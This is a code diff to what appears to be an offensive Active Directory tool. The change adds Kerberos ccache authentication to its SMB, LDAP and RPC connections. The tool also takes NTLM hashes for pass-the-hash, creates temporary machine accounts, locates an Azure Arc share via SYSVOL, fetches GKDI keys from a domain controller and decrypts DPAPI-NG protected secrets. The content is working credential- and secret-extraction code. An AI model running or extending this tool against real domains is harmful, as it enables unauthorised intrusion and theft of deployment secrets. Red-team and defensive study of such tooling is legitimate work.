@@ -14,7 +14,7 @@ import sys
 import traceback
 
 try:
-    from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
+    from ldap3 import Server, Connection, ALL, NTLM, SASL, SUBTREE
     HAS_LDAP3 = True
 except ImportError:
     HAS_LDAP3 = False
@@ -90,7 +90,7 @@ def _warn(msg): return f"{YELLOW}[!]{RESET} {msg}"
 def _bad(msg):  return f"{RED}[-]{RESET} {msg}"
 def _info(msg): return f"{CYAN}[*]{RESET} {msg}"
 
-CONFIG = {"verbose": False}
+CONFIG = {"verbose": False, "kerberos": False, "ccache": "", "dc_host": ""}
 
 def pline(prefix, status_fn, msg):
     print(f"  {BOLD}{prefix}:{RESET} {status_fn(msg)}")
@@ -118,7 +118,11 @@ def smb_connect(hostname, domain, username, password, fallback_ip=None):
         try:
             dbg("SMB", _info, f"Connecting to {target} (remoteName={hostname}) ...")
             smb = SMBConnection(hostname, target, timeout=5)
-            if username and password:
+            if CONFIG["kerberos"]:
+                dbg("SMB", _info, f"Authenticating as {domain}\\{username or '(ccache)'} with Kerberos")
+                smb.kerberosLogin(username or "", password or "", domain,
+                                   useCache=True, kdcHost=fallback_ip)
+            elif username and password:
                 lm, nt = _split_hash(password)
                 if lm:
                     dbg("SMB", _info, f"Authenticating as {domain}\\{username} with NTLM hash")
@@ -169,12 +173,23 @@ def _walk_sysvol(smb, guid, gpo_base=None, base_share="SYSVOL"):
     print()
 
 def _ldap_connect(dc, domain, username, password, prefix="LDAP"):
-    """Bind to LDAP on dc as domain\\username (NTLM) or GSSAPI (null creds).
+    """Bind to LDAP on dc as domain\\username (NTLM), GSSAPI (Kerberos/null),
+    or NTLM with hash.
 
     Returns a Connection or None on bind failure (caller handles return).
     """
     srv = Server(dc, get_info=ALL, connect_timeout=5)
     try:
+        if CONFIG["kerberos"]:
+            dbg(prefix, _info, f"Binding with GSSAPI (Kerberos ccache)")
+            # For Kerberos, GSSAPI derives the SPN from the server hostname.
+            # If dc is an IP, use dc_host (from -dc) for the SPN instead.
+            sasl_creds = None
+            if CONFIG["dc_host"] and CONFIG["dc_host"] != dc:
+                sasl_creds = (CONFIG["dc_host"],)
+            return Connection(srv, authentication=SASL, sasl_mechanism="GSSAPI",
+                             sasl_credentials=sasl_creds,
+                             auto_bind=True, auto_referrals=False)
         if username and password:
             dbg(prefix, _info, f"Binding as {domain}\\{username} (NTLM)")
             return Connection(
@@ -186,7 +201,7 @@ def _ldap_connect(dc, domain, username, password, prefix="LDAP"):
                 auto_referrals=False,
             )
         dbg(prefix, _info, "Binding with GSSAPI")
-        return Connection(srv, authentication="GSSAPI",
+        return Connection(srv, authentication=SASL, sasl_mechanism="GSSAPI",
                           auto_bind=True, auto_referrals=False)
     except Exception as e:
         pline(prefix, _bad, f"LDAP bind failed: {e}")
@@ -539,6 +554,8 @@ def main():
                         help="Domain FQDN e.g. contoso.local")
     parent.add_argument("-dc-ip", metavar="DC",       default="",
                         help="DC FQDN or IP (e.g. DC01.contoso.local or 10.0.0.1)")
+    parent.add_argument("-dc",   metavar="DC_HOST",  default="",
+                        help="DC hostname for Kerberos SPN (required with -k if -dc-ip is an IP)")
     parent.add_argument("-u",     metavar="USERNAME", default="",
                         help="Domain user (or machine account for decrypt)")
     _auth_grp = parent.add_mutually_exclusive_group(required=False)
@@ -546,6 +563,10 @@ def main():
                            help="Password")
     _auth_grp.add_argument("-H", "-hash", dest="hash", metavar="LM:NT", default="",
                            help="NTLM hash (LM:NT or bare NT hex)")
+    parent.add_argument("-k", "-kerberos", dest="kerberos", action="store_true",
+                        help="Use Kerberos authentication (requires valid ccache)")
+    parent.add_argument("-ccache", metavar="PATH", default="",
+                        help="Path to Kerberos ccache file (implies -k)")
     parent.add_argument("-v", "-verbose", dest="verbose", action="store_true",
                         help="Show every step in detail")
 
@@ -569,8 +590,10 @@ def main():
 Auth modes (pick one):
   -auto -u USER -p PASS     Create a temp machine account using domain user creds
   -auto -u USER -H LM:NT    Same, authenticating with an NTLM hash
+  -auto -u USER -k          Same, authenticating with Kerberos (ccache)
   -u MACHINE$ -p PASS       Explicit machine account credentials (NTLM)
   -u MACHINE$ -H LM:NT      Same, authenticating with an NTLM hash
+  -u MACHINE$ -k            Same, authenticating with Kerberos (ccache)
 
 If -share is omitted, the Arc share is auto-discovered via GPO/SYSVOL.
         """
@@ -589,6 +612,20 @@ If -share is omitted, the Arc share is auto-discovered via GPO/SYSVOL.
     args = parser.parse_args()
 
     CONFIG["verbose"] = getattr(args, "verbose", False)
+    if getattr(args, "ccache", ""):
+        CONFIG["ccache"] = args.ccache
+        CONFIG["kerberos"] = True
+        os.environ["KRB5CCNAME"] = args.ccache
+        dbg("AUTH", _info, f"Kerberos ccache: {args.ccache}")
+    elif getattr(args, "kerberos", False):
+        CONFIG["kerberos"] = True
+        dbg("AUTH", _info, f"Kerberos ccache: {os.environ.get('KRB5CCNAME', '(default)')}")
+
+    if CONFIG["kerberos"]:
+        CONFIG["dc_host"] = getattr(args, "dc", "") or getattr(args, "dc_ip", "") or ""
+        if not CONFIG["dc_host"]:
+            print(_bad("Kerberos mode requires -dc <hostname> (or -dc-ip <hostname>)"))
+            sys.exit(1)
 
     if args.command == "decrypt":
         cmd_decrypt(args)
@@ -613,7 +650,12 @@ If -share is omitted, the Arc share is auto-discovered via GPO/SYSVOL.
 
     print(f"  {_info(f'Domain : {domain}')}")
     print(f"  {_info(f'DC     : {dc}')}")
-    print(f"  {_info(f'User   : {domain}\\{username}' if username else 'User   : null session')}")
+    if CONFIG["kerberos"]:
+        print(f"  {_info(f'User   : {username or '(ccache)'}  [Kerberos]')}")
+    elif username:
+        print(f"  {_info(f'User   : {domain}\\{username}')}")
+    else:
+        print(f"  {_info(f'User   : null session')}")
    
     arc_in_use    = False
     share_details = []
@@ -780,6 +822,11 @@ def _create_machine_account(domain, dc, user_username, user_password, machine_na
     else:
         dbg("AUTO", _info, f"Authenticating as {domain}\\{user_username} with password")
         rpctransport.set_credentials(user_username, user_password, domain, "", "", None)
+    if CONFIG["kerberos"]:
+        dbg("AUTO", _info, f"Using Kerberos (ccache)")
+        if CONFIG["dc_host"]:
+            rpctransport.setRemoteName(CONFIG["dc_host"])
+        rpctransport.set_kerberos(True, kdcHost=dc)
     dce = rpctransport.get_dce_rpc()
     dce.connect()
     dce.bind(samr.MSRPC_UUID_SAMR)
@@ -1054,7 +1101,7 @@ def cmd_decrypt(args):
 
     # validate: need exactly one auth mode
     if not auto and not username:
-        print(_bad("Specify an auth mode: -auto -u <domain_user> -p <pass>|-H <hash>  |  -u <MACHINE$> -p <pass>|-H <hash>"))
+        print(_bad("Specify an auth mode: -auto -u <domain_user> -p <pass>|-H <hash>|-k  |  -u <MACHINE$> -p <pass>|-H <hash>|-k"))
         sys.exit(1)
 
     banner()
@@ -1066,9 +1113,15 @@ def cmd_decrypt(args):
         print(f"  {_info('Share  : (auto-discover via GPO/SYSVOL)')}")
 
     if auto:
-        print(f"  {_info(f'Mode   : auto (temp machine account as {domain}\\{username})')}")
+        if CONFIG["kerberos"]:
+            print(f"  {_info(f'Mode   : auto (temp machine account, domain user {domain}\\{username} via Kerberos)')}")
+        else:
+            print(f"  {_info(f'Mode   : auto (temp machine account as {domain}\\{username})')}")
     else:
-        print(f"  {_info(f'Mode   : NTLM machine account {domain}\\{username}')}")
+        if CONFIG["kerberos"]:
+            print(f"  {_info(f'Mode   : Kerberos machine account {domain}\\{username}')}")
+        else:
+            print(f"  {_info(f'Mode   : NTLM machine account {domain}\\{username}')}")
 
     if CONFIG["verbose"]:
         try:
@@ -1107,7 +1160,11 @@ def cmd_decrypt(args):
     cleanup_account = False
 
     if auto:
-        if not username or not password:
+        if CONFIG["kerberos"]:
+            if not username:
+                print(_bad("-auto with -k requires -u <domain_user>"))
+                sys.exit(1)
+        elif not username or not password:
             print(_bad("-auto requires -u <domain_user> -p <password>|-H <hash>"))
             sys.exit(1)
         dbg("DEC", _info, "Auto mode: creating temp machine account ...")
@@ -1183,12 +1240,25 @@ def cmd_decrypt(args):
         pline("DEC", _info, "Fetching GKDI key from Domain Controller...")
         dbg("DEC", _info, f"GKDI GetKey → {dc} ...")
         try:
+            if CONFIG["kerberos"]:
+                dpapi_proto = "kerberos"
+                if machine_pass:
+                    dpapi_user = f"{machine_user}@{domain.upper()}"
+                    dpapi_pass = machine_pass
+                else:
+                    dpapi_user = None
+                    dpapi_pass = None
+                dbg("DEC", _info, f"GKDI GetKey via Kerberos ({dpapi_user or 'ccache'})")
+            else:
+                dpapi_proto = "ntlm"
+                dpapi_user = f"{domain}\\{machine_user}"
+                dpapi_pass = machine_pass
             plaintext, _ridx = _unprotect_dpapi_ng(
                 blob,
                 server        = dc or share_server,
-                username      = f"{domain}\\{machine_user}",
-                password      = machine_pass,
-                auth_protocol = "ntlm",
+                username      = dpapi_user,
+                password      = dpapi_pass,
+                auth_protocol = dpapi_proto,
             )
             dbg("DEC", _info, f"Unwrapped via recipient[{_ridx}]")
             secret = plaintext.decode("utf-8", errors="ignore").rstrip("\x00")
